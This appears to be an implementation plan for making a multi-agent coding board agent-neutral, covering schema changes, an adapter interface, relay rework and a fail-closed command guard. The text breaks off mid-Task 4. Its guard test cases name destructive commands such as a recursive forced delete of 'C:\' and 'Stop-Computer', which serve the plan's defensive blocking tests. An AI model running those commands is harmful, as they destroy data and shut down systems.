# Agent-Neutral Core (Phase 1) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Decouple Claude Board's squad launch, seat relay, heartbeat, supervisor close, squad schema and command guard from Claude Code while keeping today's PC and Mac Claude squads running unchanged.

**Architecture:** Board rules stay in idempotent SQL (`db/schema.sql`: `cb.sessions.agent`, per-agent `cb.squad_set` validation, `cb._expected_model`); agent-specific launch, delivery, liveness, status, close and quota checks move behind `AgentAdapter` in `cli/agents/` (`claude` only in Phase 1); `cli/relay.ts` keys locks, logs and the `cb` bridge on `seatKey(machine, pane)` and reads Claude's socket from a `0600` temp endpoint file; role rules, PowerShell checks and fail-closed parsing unify in `kit/guard/core.mjs` with a thin Claude shim.

**Tech Stack:** Node 24 running `.ts`/`.mjs` directly (zero new dependencies), `postgres` 3.4.9, PL/pgSQL in `db/schema.sql`, herdr 0.9.x, `node --test` against local Postgres on `127.0.0.1:5434`.

**Spec:** `docs/superpowers/specs/2026-11-26-agent-neutral-core-design.md` (Card #4002, Phase 1 of 5).

## Global Constraints

- **Success test:** today's Claude squads on the PC (`shaltoot`) and Mac (`macbook`) run unchanged (same herdr `--kind claude` argv, messaging-socket delivery, `cb` bridge, safety fences, supervisor timing).
- **Schema rules (`CLAUDE.md`):** idempotent `db/schema.sql` (`add column if not exists`, `drop constraint if exists`, `drop function if exists cb.<name> cascade`), `#variable_conflict use_variable` in PL/pgSQL bodies with unprefixed params, top-down ordering for `language sql` functions (`test/schema-fresh.test.ts` applies twice to an empty DB).
- **Agents (exact):** `'claude' | 'codex' | 'opencode' | 'agy'`. Phase 1 registers only `'claude'` in `cli/agents/index.ts`; launching any other agent fails loudly with `agent "<kind>" is not installed yet (phase 1 supports claude only)`.
- **Roles (exact):** `'lead' | 'architect' | 'owner' | 'builder' | 'reviewer' | 'qa' | 'investigator'`. Read-only roles (exact): `'reviewer' | 'qa' | 'investigator'`.
- **Per-agent model validation:**
  - `claude`: exact enum `opus | sonnet | haiku | fable` (defaults: `sonnet` for `builder`/`qa`, `opus` for others).
  - `codex`: `^[a-z0-9][a-z0-9._-]{0,63}$`, excluding Claude aliases (`opus|sonnet|haiku|fable`); explicit `model` required.
  - `opencode`: `^[a-z0-9][a-z0-9._-]{0,31}/[A-Za-z0-9][A-Za-z0-9._:/-]{0,95}$` (`provider/model`); explicit `model` required.
  - `agy`: `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$`, excluding Claude aliases; explicit `model` required.
- **No new npm dependencies;** Node >=24 stdlib only (`package.json:6-21`). Every `case` in `cli/cb.ts` has a `cli/help.ts` entry (`test/help.test.ts:24-32`); `prompts/claude-md-snippet.md` matches `SNIPPET` (`test/help.test.ts:62-63`); role files stay <=60 lines and name only known `cb` commands (`test/squad-kit.test.ts:60-73`).
- **Fail-closed guard:** empty stdin, invalid JSON, missing/non-string `tool_input.command` on shell tools, unknown `tool_name`, or unknown `CB_ROLE` MUST return a block decision. Unset/empty `CB_ROLE` applies base dangerous + PowerShell + `CB_PROTECTED_BRANCHES` rules only.
- **Tests (PC/Mac only, never VPS, never live DB):**
  - Pure (no-DB) test: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/<file>.test.ts`
  - DB test: hold `cb lock take db2` (exit 2 = queued: wait) before, `cb lock release db2` after (even on failure):
    `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/<file>.test.ts`
  - Full suite (Task 6 only): hold `cb lock take db` / `cb lock release db`, run `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 pnpm -s test`.
- **Commits:** conventional commits ending `(#4002)` on a worktree branch, never bypass hooks, never push or touch `~/.claude` without Ahmed's explicit OK.

## Review Focus

1. **Zombie seat when Claude exits while the herdr pane stays open:** the external relay must stop calling `cb.inbox` and exit once `adapter.isAlive()` turns false, never keeping `last_seen` green on a dead agent (pinned in Task 4).
2. **Rolling handover between old socket-keyed relays and new `seatKey`-keyed `cb`:** `cb` must fall back to `sha1(CLAUDE_CODE_MESSAGING_SOCKET)` when no `seatKey` bridge exists yet, and a restarted `--child` relay inheriting socket env must seed its endpoint file without dropping messages (pinned in Task 4).
3. **Existing live squad rows (no `agent` key) and legacy `cb.iam` callers (no `agent` param):** `cb.iam`, `cb.digest`, `squad-up`, and `supervise-plan` must default absent `agent` to `'claude'` with zero DB backfill (pinned in Tasks 1 and 3).
4. **Fail-closed guard vs benign messages and PowerShell edge cases:** unreadable/array stdin, unknown `CB_ROLE`, PowerShell `Remove-Item -Recurse -Force C:\`, `Stop-Computer`, `C:\Program Files\Git\cmd\git.exe push origin main`, and PowerShell backtick continuations must block, while `cb tell` / `git commit -m` quoting those words and `Remove-Item -Recurse dist` with unset `CB_ROLE` must pass (pinned in Task 5).
5. **Non-Claude seats saved in `cb.squad_set` before Phase 2:** `cb.squad_set` must validate and store `codex`/`opencode`/`agy` roles, per-seat overrides and `fallback`, while `cb squad up` and `cb supervise` must refuse to launch an unimplemented agent instead of launching Claude (pinned in Tasks 1 and 3).

---

## File Structure

- **SQL:** `db/schema.sql` — `cb.sessions.agent`, `cb.iam`, `cb.inbox`, `cb.sessions_overview`, `cb.supervise_state`, `cb.resume`, `cb._check_model`, `cb._role_model`, `cb._expected_model`, `cb.digest`, `cb.squad_set`.
- **Adapters (new):**
  - `cli/agents/types.ts` — `AgentKind`, `AgentAdapter`, `SeatHandle`, `LaunchSpec`, `AgentStatus`, `QuotaSignal`, `GuardInstallSpec`, `InstructionMapping`, `TrustSpec`, `DisableAskSpec`.
  - `cli/agents/claude.ts` — Phase 1 Claude adapter (launch argv, endpoint-file socket delivery + liveness, herdr status, `/exit` close, passive quota matcher, guard/instructions/trust/ask descriptors).
  - `cli/agents/index.ts` — adapter registry (`getAdapter`, `AGENT_KINDS`, `isAgentKind`, `defaultModelFor`).
- **Squad & Supervisor:** `cli/squad-up.ts`, `cli/supervise-plan.ts`, `cli/supervise.ts` — resolve per-seat `(agent, model, fallback)`, inject `CB_ROLE`/`CB_AGENT`, delegate launch/status/close/dialogHint to `getAdapter`.
- **Relay & CLI:** `cli/bridge.ts` (`seatKey`), `cli/relay.ts` (outside-CLI seat relay + liveness-gated heartbeat), `hooks/claude-endpoint.mjs` (explicit Claude endpoint hook), `cli/cb.ts` (`--agent`, bridge fallback, agent-neutral `cb relay` & `cb start`, `cb squad show`), `cli/help.ts`.
- **Guard (new + wrapper):**
  - `kit/guard/core.mjs` — unified pure guard (dangerous commands, PowerShell rules, `#3809` kill-by-name, `#3746` protected branches, `CB_ROLE` role matrix, ask-deny, fail-closed `evaluate`).
  - `kit/guard/shim-claude.mjs` — thin Claude `PreToolUse` stdin/stdout shim (fail-closed on unreadable stdin).
  - `kit/guard/install.mjs` — atomic installer + 6-probe self-check + `--check` drift check for PC and Mac.
  - `kit/hooks/block-dangerous.mjs` — backward-compatible wrapper re-exporting from `../guard/core.mjs` and delegating CLI execution to `../guard/shim-claude.mjs`.
- **Docs & Prompts:** `docs/ops/maintain.md`, `prompts/roles/_common.md`.

---

### Task 1: Schema and SQL rules (`cb.sessions.agent`, per-agent `cb.squad_set`, `cb.digest`)

**Files:**
- Modify: `db/schema.sql:195-210`, `:641-652`, `:1490-1545`, `:1683-1715`, `:4110-4115`, `:4197-4204`, `:4398-4405`, `:4459-4467`, `:4513-4729`, `:5062-5085`
- Test: `test/squad-kit.test.ts`, `test/repos-squad.test.ts`, `test/squad-timers.test.ts`, `test/supervise-state.test.ts`, `test/schema-fresh.test.ts`

**Interfaces:**
- Produces:
  - Column `cb.sessions.agent text not null default 'claude'` with check constraint `sessions_agent_check` (`agent in ('claude','codex','opencode','agy')`).
  - Trigger `sessions_bind_changed` also fires when `old.agent is distinct from new.agent`.
  - `cb.iam(machine text, pane text, actor text, project text default null, role text default null, area text default null, model text default null, repo text default null, agent text default null) returns text` — raises `agent must be one of claude, codex, opencode, agy (got <x>)` on bad value; preserves existing `agent` on same-actor rebind with `null`; defaults `'claude'` on new row or actor takeover.
  - `cb.inbox`, `cb.sessions_overview`, `cb.supervise_state` (each session entry) and `cb.resume` include `'agent', s.agent`.
  - `cb._check_model(agent text, model text, label text) returns void` — validates per Global Constraints; Claude refusal text keeps `% model must be opus, sonnet, haiku or fable` (`test/squad-kit.test.ts:125`); Codex/OpenCode/agy refusals name `<label>`, `<agent>`, and the expected format.
  - `cb._role_model(role text, agent text default 'claude') returns text` — `'sonnet'`/`'opus'` for `claude`, `null` for others.
  - `cb._expected_model(project text, actor text, role text, agent text) returns text` — looks up the seat's configured model in `cb.projects.squad` (checking `seats` override by seat key, then `roles.<role>.model`), falling back to `cb._role_model(role, agent)` only when the project has no squad or role entry. Used by `cb.digest` group 10 (`db/schema.sql:4197-4204`).
  - `cb.squad_set` accepts role keys `count, model, machine, agent, fallback, seats`:
    - `agent`: optional, default `'claude'`, omitted in saved JSON when `'claude'`.
    - `fallback`: optional array of 0–5 `{ agent, model }` objects (no extra keys, valid via `cb._check_model`, no duplicate `(agent, model)` pairs, none equal to primary `(agent, model)`), omitted in saved JSON when absent/empty.
    - `seats`: optional object mapping seat key (`"1"`..`"<count>"` flat/project-wide, `"<repo>:<1..count[repo]>"` multi-repo `builder`/`reviewer`, `"<area>"` for `owner`, `"1"` for `lead`) to non-empty `{ agent?, model?, fallback? }`; effective `agent`/`model`/`fallback` validated by the same rules.

- [ ] **Step 1: Write the failing tests**
  - In `test/squad-kit.test.ts`:
    - `cb.iam stores agent, defaults to claude, preserves on rebind, refuses unknown`: insert without `agent` → `sessions.agent === 'claude'`; bind with `agent => 'codex'` → `'codex'`; rebind same actor with `agent => null` → stays `'codex'`; takeover by new actor with `agent => null` → `'claude'`; `agent => 'gemini'` rejects `/agent must be one of claude, codex, opencode, agy/`.
    - `cb.sessions_overview, cb.inbox and cb.resume return agent`: bind `'codex'` → `inbox.agent === 'codex'`, `sessions_overview[0].agent === 'codex'`, `resume.agent === 'codex'`.
    - `squad_set validates agent, per-agent models, fallback and seats`:
      - Valid: `builder` with `agent: 'codex', model: 'gpt-6.1-sol'`; `reviewer` with `agent: 'opencode', model: 'anthropic/claude-opus-5-5'`; `qa` with `agent: 'agy', model: 'gemini-4-neon-xhigh'`; `fallback: [{ agent: 'codex', model: 'gpt-6.1-sol' }]`; `seats: { '2': { agent: 'codex', model: 'gpt-6.1-sol' } }` on `count: 3`; `seats: { claims: { agent: 'codex', model: 'gpt-6.1-sol' } }` on `owner`.
      - Refused: unknown agent (`'grok'`) → `/builder agent must be one of/`; `agent: 'codex'` with omitted model → `/builder model is required for codex/`; `agent: 'codex', model: 'sonnet'` → `/builder model .* not valid for codex/`; `agent: 'opencode', model: 'gpt-6.1-sol'` (missing `/`) → `/provider\/model/`; `fallback` >5 entries, unknown key, duplicate pair, or matching primary `(agent, model)`; `seats` key `'4'` when `count: 3`, empty seat object `{}`, unknown owner area `'other'`.
      - Existing Claude-only squad without `agent`/`fallback`/`seats` saves **byte-identical** to `SQUAD` (`test/squad-kit.test.ts:112`, `test/repos-squad.test.ts:64` stay unchanged!).
  - In `test/repos-squad.test.ts`:
    - `squad_set validates multi-repo seat keys`: `builder.seats = { 'api:2': { agent: 'codex', model: 'gpt-6.1-sol' } }` succeeds; `'api:3'` (above count 2), `'web:1'` (unknown repo), `'1'` (missing repo prefix) are refused with field-naming errors.
  - In `test/squad-timers.test.ts`:
    - `digest group 10 respects the squad file's configured model per role and seat`: when project has a squad setting `builder` to `opus` (or seat 2 to `codex`/`gpt-6.1-sol`), a live session on that model emits NO wrong-model digest line; a session on a mismatched model emits it; a project without a squad still uses `cb._role_model` (`test/squad-timers.test.ts:172`).
  - In `test/supervise-state.test.ts`:
    - `supervise_state sessions include agent (defaulting to claude)`: verify `sessions[].agent` is `'claude'` for legacy rows and `'codex'` when bound with `agent => 'codex'`.

- [ ] **Step 2: Run tests to verify they fail**
  Take `cb lock take db2`, then run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/squad-kit.test.ts test/repos-squad.test.ts test/squad-timers.test.ts test/supervise-state.test.ts`
  Release `cb lock release db2`.
  Expected: FAIL on missing `agent` column / `cb.iam` param / `squad_set` unknown key errors.

- [ ] **Step 3: Implement SQL changes in `db/schema.sql`**
  - Add `cb.sessions.agent` column + `sessions_agent_check` right after line 209 (before any `language sql` function).
  - Add `or old.agent is distinct from new.agent` to `sessions_bind_changed` (`:650-652`).
  - Update `cb.iam`, `cb.inbox`, `cb.sessions_overview`, `cb.resume`, `cb.supervise_state`.
  - Add `drop function if exists cb._check_model cascade;` and `cb._expected_model cascade;` in their section drop blocks; update `cb._role_model` (drop + recreate with `agent text default 'claude'`), implement `cb._check_model` and `cb._expected_model`, update `cb.digest` group 10 (`:4197-4204`), and extend `cb.squad_set` (`:4631-4680`).

- [ ] **Step 4: Run tests to verify they pass**
  Take `cb lock take db2`, then run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/squad-kit.test.ts test/repos-squad.test.ts test/squad-timers.test.ts test/supervise-state.test.ts test/schema-fresh.test.ts test/relay.test.ts`
  Release `cb lock release db2`.
  Expected: all PASS (including `test/schema-fresh.test.ts` applying twice on a blank DB).

- [ ] **Step 5: Commit**
  ```bash
  git add db/schema.sql test/squad-kit.test.ts test/repos-squad.test.ts test/squad-timers.test.ts test/supervise-state.test.ts
  git commit -m "feat(schema): add session agent, per-agent squad validation, seats and fallback (#4002)"
  ```

---

### Task 2: Agent adapter interface and Claude adapter (`cli/agents/`)

**Files:**
- Create: `cli/agents/types.ts`, `cli/agents/claude.ts`, `cli/agents/index.ts`
- Modify: `cli/bridge.ts:20-26`
- Test: `test/agents.test.ts` (new, pure — no DB)

**Interfaces:**
- Consumes: None (pure module; adds `seatKey` to `cli/bridge.ts`).
- Produces:
  - `cli/bridge.ts`: `export function seatKey(machine: string, pane: string): string` (`sha1(\`${machine.trim().toLowerCase()}:${pane.trim()}\`).slice(0, 12)`).
  - `cli/agents/types.ts`: exports `AgentKind`, `AgentState`, `SeatHandle`, `LaunchSpec`, `AgentStatus`, `QuotaSignal`, `GuardInstallSpec`, `InstructionMapping`, `TrustSpec`, `DisableAskSpec`, `LaunchInput` (`{ name, role, area?, repo, agent, model, board, cwd, env? }`), `AgentAdapter`.
  - `cli/agents/claude.ts`:
    - `export function claudeEndpointPath(machine: string, pane: string): string` → `join(tmpdir(), \`cb-seat-${seatKey(machine, pane)}.claude.json\`)`.
    - `export function writeClaudeEndpoint(machine: string, pane: string, ep: { socket: string; token: string; pid?: number }): string` (atomic write `.tmp.<pid>` + `renameSync`, mode `0o600`).
    - `export function readClaudeEndpoint(machine: string, pane: string): { socket: string; token: string; pid?: number; updatedAt: string } | null`.
    - `export function clearClaudeEndpoint(machine: string, pane: string, expectedSocket?: string): void`.
    - `export const claudeAdapter: AgentAdapter`:
      - `kind: 'claude'`, `relayStart: 'session-hook'`.
      - `buildLaunch(l)` → `{ kind: 'claude', args: ['--model', l.model, '--permission-mode', 'bypassPermissions', '--settings', \`${l.board.replace(/[\/]+$/, '')}/kit/permissions/${l.role}.json\`], env: {} }`.
      - `deliver(seat, text)` → reads `readClaudeEndpoint(seat.machine, seat.pane)`, connects over `net.connect(ep.socket)` with 5 s timeout, writes `{"type":"auth","token":ep.token}\n{"type":"user","message":{"role":"user","content":text}}\n`; on `ENOENT`/`ECONNREFUSED`, re-reads endpoint file once and retries if `socket` changed, else rejects.
      - `isAlive(seat)` → `true` iff `ep = readClaudeEndpoint(...)` exists and `existsSync(ep.socket)`.
      - `readStatus(_seat, herdrAgent)` → maps `herdrAgent?.agent_status` to `AgentState` (`'unknown'` if absent), `safeToClose: status === 'idle' || status === 'done'`.
      - `close(seat, run)` → calls `run(seat.herdr ?? null, ['agent', 'prompt', seat.herdrName!, '/exit'], 30_000)` → `'sent'` if `status === 0`, else `'failed'`.
      - `detectQuotaStop(_seat, _herdrAgent, paneTail)` → matches Claude usage/rate-limit phrases (`usage limit reached|hit your limit|rate limit`) on `paneTail`, else `null`.
      - `guardInstallSpec`, `instructionMapping`, `trustSpec` (`dialogHint: 'folder trust or bypass warning'`), `disableAskSpec` (`toolName: 'AskUserQuestion'`, `mechanism: 'hook'`, `target: 'hooks/deny-ask.mjs'`).
  - `cli/agents/index.ts`:
    - `export const AGENT_KINDS = ['claude', 'codex', 'opencode', 'agy'] as const;`
    - `export function isAgentKind(v: unknown): v is AgentKind`
    - `export function getAdapter(kind: string): AgentAdapter` — returns `claudeAdapter` for `'claude'`; throws `agent "${kind}" is not installed yet (phase 1 supports claude only)` for known-unimplemented kinds; throws `unknown agent "${kind}": expected claude, codex, opencode or agy` otherwise.
    - `export function defaultModelFor(agent: AgentKind, role: string): string | null`.

- [ ] **Step 1: Write the failing tests** in `test/agents.test.ts`:
  ```ts
  test('registry returns claude adapter and refuses unimplemented or unknown kinds', () => {
    assert.equal(getAdapter('claude').kind, 'claude');
    for (const k of ['codex', 'opencode', 'agy'])
      assert.throws(() => getAdapter(k), new RegExp(`agent "${k}" is not installed yet`));
    assert.throws(() => getAdapter('grok'), /unknown agent "grok"/);
  });
  ```
  - `claudeAdapter.buildLaunch produces exact current Claude argv`: asserts `kind === 'claude'` and `args` equals `['--model', 'sonnet', '--permission-mode', 'bypassPermissions', '--settings', '/b/kit/permissions/builder.json']` (trailing slashes stripped).
  - `claudeAdapter endpoint file round-trip, deliver, socket-rotation retry, and isAlive`: start a local `net.createServer` socket/pipe, `writeClaudeEndpoint`, assert `isAlive === true`, `deliver` writes auth+user JSON lines, rotate to a second server and rewrite endpoint file while first is closed → `deliver` succeeds on retry, close server → `isAlive === false`, `clearClaudeEndpoint` removes only when `expectedSocket` matches.
  - `claudeAdapter.readStatus and close`: `idle`/`done` → `safeToClose: true`; `working`/`blocked`/`unknown`/`null` → `safeToClose: false`; `close` calls `run` with `['agent', 'prompt', 'sv-b1-macbook', '/exit']` and returns `'sent'` on status 0, `'failed'` on status 1.
  - `claudeAdapter descriptors and quota stop`: checks `trustSpec.dialogHint === 'folder trust or bypass warning'`, `disableAskSpec().toolName === 'AskUserQuestion'`, `guardInstallSpec` matchers (`Bash|PowerShell` on `win32`, `Bash` on `darwin`), `detectQuotaStop` matches limit line and returns `null` on normal text.

- [ ] **Step 2: Run test to verify it fails**
  Run: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/agents.test.ts`
  Expected: FAIL (`ERR_MODULE_NOT_FOUND` for `cli/agents/index.ts`).

- [ ] **Step 3: Implement `seatKey` in `cli/bridge.ts` and `cli/agents/{types,claude,index}.ts`**
  Keep `claude.ts` free of DB imports so it stays pure/testable without Postgres. On POSIX `writeClaudeEndpoint` uses `{ mode: 0o600 }`; cleanup temp file in `catch`.

- [ ] **Step 4: Run tests to verify they pass**
  Run: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/agents.test.ts`
  Expected: all PASS.

- [ ] **Step 5: Commit**
  ```bash
  git add cli/bridge.ts cli/agents/types.ts cli/agents/claude.ts cli/agents/index.ts test/agents.test.ts
  git commit -m "feat(agents): add AgentAdapter interface, registry and Claude adapter (#4002)"
  ```

---

### Task 3: Wire adapters into `cb squad up`, `cb supervise`, `cb` CLI and `cb help`

**Files:**
- Modify: `cli/squad-up.ts:7-16`, `:67-105`, `:167-213`, `:258-265`
- Modify: `cli/supervise-plan.ts:4-18`, `:20-88`
- Modify: `cli/supervise.ts:10-12`, `:163-187`, `:255-256`
- Modify: `cli/cb.ts:16-30`, `:576-585`, `:742-751`
- Modify: `cli/help.ts:20-23`, `:50-52`, `:211`
- Test: `test/squad-up.test.ts`, `test/supervise-plan.test.ts`, `test/supervise.test.ts`, `test/help.test.ts`

**Interfaces:**
- Consumes: `getAdapter`, `AgentKind` (`cli/agents/index.ts`, Task 2); `cb.sessions.agent` & `cb.squad_set` (`agent`, `fallback`, `seats`, Task 1).
- Produces:
  - `cli/squad-up.ts`:
    - `SeatOverride = { agent?: AgentKind; model?: string; fallback?: { agent: AgentKind; model: string }[] }`.
    - `Role` gains optional `agent?: AgentKind; fallback?: { agent: AgentKind; model: string }[]; seats?: Record<string, SeatOverride>`.
    - `Want` gains `seatKey: string` (`"1"`, `"2"`, `"api:1"`, `"claims"`, etc.).
    - `Launch` gains `agent: AgentKind; board: string; fallback?: { agent: AgentKind; model: string }[]`; `env` always includes `CB_ROLE` and `CB_AGENT` (plus `CB_PROTECTED_BRANCHES` when `squad.protected?.length`, and adapter extra env). `settings` remains populated for Claude (`<board>/kit/permissions/<role>.json`) for backward compatibility.
    - `export function seatSpec(squad: Squad, w: Want): { agent: AgentKind; model: string; fallback?: { agent: AgentKind; model: string }[] }`.
    - `launchFor`: resolves `seatSpec`, appends `--agent <agent>` to `prompt` **only when `agent !== 'claude'`** (so every Claude prompt stays byte-identical).
    - `startOne`: resolves `adapter = getAdapter(l.agent)` **before creating a pane** (so an unimplemented Phase 2+ agent fails immediately with `failed <name>: agent "<kind>" is not installed yet...` and never leaks a pane!); builds `herdr agent start` from `adapter.buildLaunch(l)`; formats `agent_not_ready` using `adapter.trustSpec([l.cwd], process.platform).dialogHint`.
  - `cli/supervise-plan.ts`:
    - `Session` gains `agent?: AgentKind`.
    - `TickInput` gains optional `safeToClose?: Record<string, boolean>` (keyed by herdr name; when omitted, `planTick` falls back to `READY.has(i.herdrStatus[herdrName(w.name)] ?? '')`, keeping all existing pure `planTick` tests unchanged).
  - `cli/supervise.ts`:
    - `tick()` precomputes `safeToClose` per squad session via `await getAdapter(s.agent ?? 'claude').readStatus(seat, { agent_status: herdrStatus[hn] })` (for unregistered kinds, `safeToClose = false`) and passes it into `planTick`.
    - `closeOne`: reads `agent = s.agent ?? 'claude'`, resolves `adapter = getAdapter(agent)` (if unregistered, clears `closing_at` and skips), re-checks `(await adapter.readStatus(seat, { agent_status: status })).safeToClose` before closing, and calls `await adapter.close(seat, run)` instead of hardcoded `/exit`.
    - Version hash (`:255-256`) includes `agents/index.ts` and `agents/claude.ts`.
  - `cli/cb.ts`:
    - `OPTIONS` adds `agent: { type: 'string' }`.
    - `case 'iam'`: passes `agent: o.agent ?? process.env.CB_AGENT ?? null` to `cb.iam`.
    - `case 'squad'` `show`: prints `builder  2 × sonnet on macbook` for Claude (unchanged) and `reviewer  1 × gpt-6.1-sol (codex) on macbook` (plus per-seat overrides line when `seats` present) for non-Claude.

- [ ] **Step 1: Write the failing tests**
  - In `test/squad-up.test.ts`:
    - `launchFor sets CB_ROLE and CB_AGENT in pane env and defaults missing agent to claude`: legacy `IHOP` squad (no `agent` key) → `agent === 'claude'`, `env: { CB_ROLE: 'builder', CB_AGENT: 'claude' }`, `prompt` byte-identical to `IHOP_LAUNCH`; squad with `protected` → `env` has `CB_ROLE`, `CB_AGENT`, AND `CB_PROTECTED_BRANCHES`. (Update existing `test/squad-up.test.ts:88-90,389,564-576` assertions to account for `agent`, `board`, `CB_ROLE`, `CB_AGENT` while keeping `IHOP_WANT`/`IHOP_RESUME` and herdr native args unchanged.)
    - `seatSpec resolves per-seat overrides and non-Claude prompt includes --agent`: `reviewer` with `count: 2` and `seats: { '2': { agent: 'codex', model: 'gpt-6.1-sol' } }` → `R1` has `agent: 'claude', model: 'opus'` (no `--agent` in prompt), `R2` has `agent: 'codex', model: 'gpt-6.1-sol'` (prompt contains `--agent codex --model gpt-6.1-sol`).
    - `startOne refuses an unimplemented agent before creating a pane`: `startOne` with `agent: 'codex'` → `{ ok: false }`, line matches `/agent "codex" is not installed yet/`, zero herdr `tab create` / `pane split` / `agent start` calls.
  - In `test/supervise-plan.test.ts`:
    - `planTick respects precomputed safeToClose per session`: session with `herdrStatus = 'idle'` is NOT in `plan.close` when `safeToClose[hn] === false`, while a session with `safeToClose[hn] === true` IS closed (and omitted `safeToClose` preserves `READY.has(status)`).
  - In `test/supervise.test.ts`:
    - `closeOne delegates through the Claude adapter`: existing close tests pass unchanged, plus a session whose `agent` is `'codex'` (no adapter yet) is skipped cleanly without sending `/exit` and clears `closing_at`.
  - In `test/help.test.ts`:
    - `cb help iam` documents `--agent`; `cb help squad` documents `agent`, `seats` and `fallback`.

- [ ] **Step 2: Run tests to verify they fail**
  Run pure tests first:
  `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/squad-up.test.ts test/supervise-plan.test.ts`
  Then take `cb lock take db2` and run `test/supervise.test.ts test/help.test.ts`, then `cb lock release db2`.
  Expected: FAIL on missing `seatSpec`, `CB_ROLE`/`CB_AGENT`, and adapter refusal.

- [ ] **Step 3: Implement updates in `cli/squad-up.ts`, `cli/supervise-plan.ts`, `cli/supervise.ts`, `cli/cb.ts`, `cli/help.ts`**
  Keep `startOne` pane-env merge clean (`{ CB_ROLE: w.role, CB_AGENT: agent, ...adapterEnv, ...(protected ? { CB_PROTECTED_BRANCHES } : {}) }`). In `squad-up.ts:259` and `supervise.ts:110`, print `(${l.role}, ${l.model})` for Claude (keeping existing output assertions intact) and `(${l.role}, ${l.agent}/${l.model})` when `l.agent !== 'claude'`.

- [ ] **Step 4: Run tests to verify they pass**
  Run pure: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/squad-up.test.ts test/supervise-plan.test.ts test/agents.test.ts`
  Take `cb lock take db2`, run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/supervise.test.ts test/help.test.ts test/squad-kit.test.ts test/repos-squad.test.ts`
  Release `cb lock release db2`.
  Expected: all PASS.

- [ ] **Step 5: Commit**
  ```bash
  git add cli/squad-up.ts cli/supervise-plan.ts cli/supervise.ts cli/cb.ts cli/help.ts test/squad-up.test.ts test/supervise-plan.test.ts test/supervise.test.ts test/help.test.ts
  git commit -m "feat(squad): wire AgentAdapter into squad-up, supervisor and cb CLI (#4002)"
  ```

---

### Task 4: Seat relay outside the CLI (`cli/relay.ts`, `cli/cb.ts`, `hooks/claude-endpoint.mjs`)

**Files:**
- Create: `hooks/claude-endpoint.mjs`
- Modify: `cli/relay.ts:1-90`, `:197-273`
- Modify: `cli/cb.ts:65-72`, `:223-247`, `:570-575`
- Modify: `cli/help.ts:30-32`, `:418-441`
- Test: `test/relay.test.ts`, `test/bridge.test.ts`, `test/help.test.ts` (plus verify `test/asks.test.ts`, `test/followup.test.ts`, `test/github.test.ts`, `test/sendback.test.ts`)

**Interfaces:**
- Consumes: `seatKey`, `serveBridge`, `openBridge`, `bridgeFiles` (`cli/bridge.ts`); `getAdapter`, `claudeEndpointPath`, `writeClaudeEndpoint`, `clearClaudeEndpoint` (`cli/agents/`).
- Produces:
  - `hooks/claude-endpoint.mjs`: Claude `SessionStart` hook script — when `CLAUDE_CODE_MESSAGING_SOCKET`, `CLAUDE_CODE_MESSAGING_TOKEN` and `HERDR_PANE_ID` are set, calls `writeClaudeEndpoint(machine(), pane, { socket, token, pid: process.ppid })` and spawns `cli/relay.ts --pane <pane> --agent claude` detached if not already running; prints nothing, exits 0.
  - `cli/relay.ts`:
    - Accepts `--pane <id>` (else `$HERDR_PANE_ID`), `--agent <kind>` (else `$CB_AGENT`, else `'claude'`), `--child`, `--restart`.
    - Key is `seatKey(machine(), pane)` (no longer `sha1(SOCKET)`).
    - Launcher (no `--child`): if `CLAUDE_CODE_MESSAGING_SOCKET` and `_TOKEN` are present in env, writes `cb-seat-<key>.claude.json` first; if `--restart`, kills old lock PID; spawns `--child --pane <pane> --agent <agent>` detached (without requiring socket env in the child).
    - Child (`--child`): if `agent === 'claude'` and env carries `CLAUDE_CODE_MESSAGING_SOCKET` + `_TOKEN` and no newer endpoint file exists, seeds `cb-seat-<key>.claude.json` (backward-compatible with existing `--child` tests and mid-rollout auto-restarts!).
    - `CODE` watch list (`cli/relay.ts:47`) includes `cli/agents/index.ts` and `cli/agents/claude.ts`.
    - `check()`: calls `await adapter.isAlive(seat)` **before** `cb.inbox`; if `false`, triggers clean shutdown (`leaving = true`, clears endpoint if matching, clears lock, closes bridge, exits 0) without calling `cb.inbox` so `last_seen` never stays falsely green. Calls `adapter.deliver(seat, ...)` instead of inline `post()`.
    - Watchdog (`2000 ms` interval): checks `await adapter.isAlive(seat)` (replacing `existsSync(SOCKET)` at `:260`) and `CODE` mtime auto-restart (`:266-272`).
  - `cli/cb.ts`:
    - Bridge lookup (`:67-71`): when `pane && !process.env.PGAPPNAME && cmd !== 'help' && !o.help`, tries `openBridge(seatKey(machine(), pane), ...)` first, then falls back to `openBridge(sha1(CLAUDE_CODE_MESSAGING_SOCKET).slice(0, 12), ...)` if `CLAUDE_CODE_MESSAGING_SOCKET` is set (rolling upgrade compatibility).
    - `relayOn()` (`:224-232`): checks `cb-relay-<seatKey>.pid` first, then legacy `cb-relay-<sha1(SOCKET)>.pid`. When neither is alive: returns `null` if `!pane`, or if `agent === 'claude'` and neither `CLAUDE_CODE_MESSAGING_SOCKET` nor a live `cb-seat-<key>.claude.json` exists; otherwise returns `false`.
    - `case 'relay'` (`:570-575`): requires `pane`; resolves `agent` from `o.agent ?? process.env.CB_AGENT ?? sessionAgent ?? 'claude'`; validates adapter via `getAdapter(agent)`; for `claude`, requires `CLAUDE_CODE_MESSAGING_SOCKET` or a live endpoint file; spawns `cli/relay.ts --pane <pane> --agent <agent> [--restart]`.

- [ ] **Step 1: Write the failing tests**
  - In `test/relay.test.ts`:
